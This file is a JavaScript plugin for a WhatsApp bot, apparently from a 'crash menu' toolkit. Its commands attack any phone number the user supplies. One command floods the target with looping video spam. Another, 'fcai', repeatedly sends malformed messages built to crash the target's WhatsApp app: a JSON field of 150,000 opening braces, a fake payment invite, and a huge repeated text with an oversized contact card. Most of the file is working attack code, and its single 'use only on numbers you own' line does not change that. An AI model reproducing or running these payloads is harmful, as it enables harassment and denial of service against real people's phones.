const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [count]\nExample: .${cmdName} 94712345678 10`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== VIDEO SPAM (loopable) ====================
async function spamVideo(conn, target) {
    const videoUrls = [
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4'
    ];
    const captions = [
        '🔥 Angee kamu kan?!',
        '🎬 Video spesial buat kamu!'
    ];
    const randomVideo = videoUrls[Math.floor(Math.random() * videoUrls.length)];
    const randomCaption = captions[Math.floor(Math.random() * captions.length)];
    await conn.sendMessage(target, {
        video: { url: randomVideo },
        mimetype: 'video/mp4',
        caption: randomCaption
    });
}

cmd({
    pattern: "videospam",
    desc: "🎥 Send random videos in a loop (default 10, max 50)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "videospam");
    if (!target) return;
    let count = parseInt(args[1]) || 10;
    if (count > 50) count = 50;
    await reply(`🎥 *VIDEO SPAM* → ${target}\n_Sending ${count} random videos..._`);
    try {
        for (let i = 0; i < count; i++) {
            await spamVideo(conn, target);
            await new Promise(r => setTimeout(r, 200));
        }
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ VIDEO SPAM DELIVERED → ${target}\n⚠️ *${count} videos sent.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== FC MODAL GPT (loopable) ====================
async function fcModalGpt(conn, target) {
    // First payload: interactiveMessage with externalAdReply
    const interactiveMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        stanzaId: "xyo_ai" + Date.now(),
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 999,
                                expiryTimestamp: 9999999999999,
                                businessOwnerJid: target
                            }
                        },
                        forwardingScore: 999999,
                        isForwarded: true,
                        externalAdReply: {
                            title: "xyo_ai",
                            body: "davina karamoy",
                            thumbnailUrl: "https://files.catbox.moe/n3ze5i.jpg",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(150000)
                    },
                    body: {
                        text: `xyo ai`.repeat(50)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, interactiveMsg.message, {});

    // Second payload: extendedTextMessage with huge text + quoted contact
    const extendedMsg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "xyo ai".repeat(50000),
            contextInfo: {
                quotedMessage: {
                    contactMessage: {
                        displayName: "xyo ai".repeat(5000),
                        vcard: "BEGIN:VCARD\nxyo gpt".repeat(5000)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, extendedMsg.message, {});
}

cmd({
    pattern: "fcai",
    desc: "🤖 Send FcModalGpt crash in a loop (default 10, max 50)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "fcai");
    if (!target) return;
    let count = parseInt(args[1]) || 10;
    if (count > 50) count = 50;
    await reply(`🤖 *FC MODAL GPT* → ${target}\n_Sending ${count} cycles (2 payloads each)..._`);
    try {
        for (let i = 0; i < count; i++) {
            await fcModalGpt(conn, target);
            await new Promise(r => setTimeout(r, 150));
        }
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ FC MODAL GPT DELIVERED → ${target}\n⚠️ *${count} cycles sent (${count*2} payloads).*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== MENU ====================
cmd({
    pattern: "bugmenu",
    desc: "Show available crash commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .videospam [number] [count] – 🎥 Random video spam (loop)*\n*│ 📌 .fcai [number] [count] – 🤖 FcModalGpt crash (loop)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .videospam 94712345678 20\n> .fcai 94712345678 15\n> ⚠️ *Use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
